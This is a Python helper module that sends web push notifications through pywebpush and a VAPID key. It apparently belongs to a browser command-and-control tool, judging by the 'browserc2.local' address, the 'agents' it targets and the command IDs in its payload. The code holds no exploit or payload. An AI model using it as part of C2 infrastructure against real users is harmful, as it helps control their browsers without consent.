"""
Push notification utilities
"""
from pywebpush import webpush, WebPushException
import json
from py_vapid import Vapid

# Load Vapid object once
_vapid_instance = None

def get_vapid_instance():
    """Get or create Vapid instance"""
    global _vapid_instance
    if _vapid_instance is None:
        _vapid_instance = Vapid.from_file('private_key.pem')
    return _vapid_instance

def send_push_notification(agent, command, title, message, url, icon):
    """
    Send push notification to an agent
    """
    try:
        subscription_info = agent.get_push_subscription()
        
        notification_data = {
            'title': title,
            'body': message,
            'icon': icon,
            'data': {
                'url': url,
                'agent_id': agent.agent_id,
                'command_id': command.id if command else None
            }
        }
        
        vapid = get_vapid_instance()
       
        webpush(
            subscription_info=subscription_info,
            data=json.dumps(notification_data),
            vapid_private_key=vapid,  # Pass Vapid object
            vapid_claims={
                "sub": "mailto:admin@browserc2.local"
            }
        )
        
        print(f"[+] Push notification sent to agent {agent.agent_id}")
        return True
        
    except WebPushException as e:
        print(f"[-] WebPush error for agent {agent.agent_id}: {str(e)}")
        if e.response and e.response.status_code == 410:
            print(f"[!] Subscription expired for agent {agent.agent_id}")
        return False
        
    except Exception as e:
        print(f"[-] Push notification error: {str(e)}")
        import traceback
        traceback.print_exc()
        return False
